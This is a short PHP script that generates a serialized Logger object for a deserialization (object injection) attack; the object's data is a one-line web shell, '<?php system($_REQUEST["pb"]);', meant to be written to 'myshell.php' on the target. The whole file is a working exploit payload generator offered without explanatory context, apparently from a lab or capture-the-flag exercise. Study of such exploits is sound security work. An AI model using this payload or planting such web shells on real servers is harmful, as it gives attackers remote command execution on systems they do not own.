<?php
require("logger.php");
$file = 'myshell.php';
$data = '<?php system($_REQUEST["pb"]);';
$o = new Logger($file, $data);
echo serialize($o);
exit();
?>
